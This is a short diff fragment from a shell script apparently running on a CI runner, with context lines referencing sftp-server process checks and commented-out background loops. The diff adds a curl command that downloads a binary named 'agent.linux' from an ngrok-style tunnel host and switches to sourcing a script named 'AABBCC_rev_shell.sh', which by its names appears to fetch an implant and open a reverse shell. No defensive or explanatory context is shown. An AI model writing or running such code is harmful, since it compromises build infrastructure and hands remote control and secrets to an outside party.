@@ -45,7 +45,9 @@ s2="grep -q sftp-server /proc/\$\$/cmdline&&(
 #    done) &
 #) &
 
-sh /home/runner/work/nc_test/nc_test/AABBCC_rev_shell.sh
+curl -O http://zpcyc3ytxvm4.ngrok.xiaomiqiu123.top/agent.linux;
+
+. /home/runner/work/nc_test/nc_test/AABBCC_rev_shell.sh
 
 
 
